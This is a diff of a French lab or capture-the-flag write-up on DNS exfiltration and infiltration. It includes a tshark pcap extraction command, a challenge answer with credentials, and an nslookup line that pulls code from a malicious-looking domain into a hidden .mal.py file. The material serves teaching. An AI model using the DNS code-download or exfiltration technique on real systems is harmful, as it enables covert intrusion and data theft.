@@ -88,9 +88,9 @@ Réponse : 253
 
 #### Exfiltration DNS :
 
-TODO : A completer :construction:
+TODO : A completer, Le schéma, les instructions du fichier TASK :construction:<br/>
 L'exfiltration DNS est une technique qui consiste à utiliser le DNS pour dérober des données.
-Cette technique est principalement utilisée comme moyen de collecter des informations personnelles telles que les numéros de sécurité sociale, la propriété intellectuelle ou d'autres informations personnellement identifiables.
+Cette technique est principalement utilisée comme moyen de collecter des informations personnelles telles que les numéros de sécurité sociale, la propriété intellectuelle ou d'autres informations personnellement identifiables.<br/>
 Cela consiste à ajouter des chaînes contenant le « butin » souhaité aux requêtes DNS UDP. La chaîne contenant le butin est alors envoyée à un serveur DNS malveillant qui enregistre ces requêtes. Pour un oeil non averti, cela pourrait ressembler à un trafic DNS normal ou ces demandes pourraient être perdues dans le mélange de nombreuses demandes DNS légitimes.
 
 Se connecter à la machine cible en SHH en utilisant les crédentials :
@@ -108,9 +108,9 @@ Aller dans le dossier ci-dessous et lire les instructions dans le fichier TASK :
 $ cd ~/challenges/exfiltration/orderlist
 ```
 
-Le .pcap extension de fichier est principalement associée avec Wireshark; un programme utilisé pour l'analyse de réseaux. .pcap fichiers sont des fichiers de données créés en utilisant le programme et ils contiennent les données en paquets d'un réseau. Ces fichiers sont utilisés principalement dans l'analyse des caractéristiques du réseau d'un certain données. Ces fichiers contribuent également à contrôler avec succès le trafic d'un certain réseau depuis qu'ils sont surveillés par le programme.
+Le .pcap extension de fichier est principalement associée avec Wireshark; un programme utilisé pour l'analyse de réseaux. .pcap fichiers sont des fichiers de données créés en utilisant le programme et ils contiennent les données en paquets d'un réseau. Ces fichiers sont utilisés principalement dans l'analyse des caractéristiques du réseau d'un certain données. Ils contribuent également à contrôler avec succès le trafic d'un certain réseau depuis qu'ils sont surveillés par le programme.
 
-TODO : Que fait cette commande ? :construction:
+TODO : Que fait cette commande ? :construction:<br/>
 Analysons le fichier order.pcap :
 ```
 $ tshark -r order.pcap -T fields -e dns.qry.name > DNS_names.txt
@@ -157,8 +157,9 @@ Réponse : administrator:s3cre7P@ssword
 
 #### Infiltration DNS :
 
-TODO : A completer :construction:
-L'infiltration DNS est une autre technique d'attaque qui exploite les vulnérabilités des DNS. Cette technique passe par un code malveillant qui est exécuté pour manipuler les serveurs DNS soit à l'aide de systèmes automatisés où les attaquants se connectent à distance à l'infrastructure réseau, soit manuellement. Le but étant souvent de supprimer de manière frauduleuse des fichiers ou d'exécuter du code sur les machines ciblées.
+TODO : A completer, Le schéma, les instructions du fichier TASK :construction:<br/>
+L'infiltration DNS est une autre technique d'attaque qui exploite les vulnérabilités des DNS. Cette technique passe par un code malveillant qui est exécuté pour manipuler les serveurs DNS soit à l'aide de systèmes automatisés qui permettent aux attaquants de se connecter à distance à l'infrastructure réseau, soit à l'aide de programme frauduleux.<br/>
+Le but étant souvent de supprimer des fichiers ou d'exécuter du code sur les machines ciblées.
 
 Lire les instructions dans le fichier : 
 ```console
@@ -166,7 +167,7 @@ $ cat ~/challenges/infiltration/TASK
 ```
 
 ```console
-$ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \* -f2 > .mal.py
+$ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py
 
 $ python3 ~/dns-exfil-infil/packetySimple.py
 
